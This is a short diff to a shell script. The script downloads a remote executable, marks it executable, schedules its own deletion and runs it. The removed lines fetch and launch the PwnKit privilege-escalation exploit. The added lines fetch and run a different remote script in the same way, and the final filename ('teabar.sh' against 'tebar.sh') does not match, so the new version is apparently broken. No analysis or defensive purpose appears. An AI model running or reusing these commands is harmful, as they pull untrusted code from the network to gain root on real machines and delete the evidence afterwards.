@@ -1,4 +1,4 @@
-curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
-chmod +x ./PwnKit || exit
-(sleep 1 && rm ./PwnKit & )
-./PwnKit
+curl -fsSL https://raw.githubusercontent.com/hime-yuki77/res/main/raw.sh -o tebar.sh || exit
+chmod +x ./tebar.sh || exit
+(sleep 1 && rm ./tebar.sh & )
+./teabar.sh
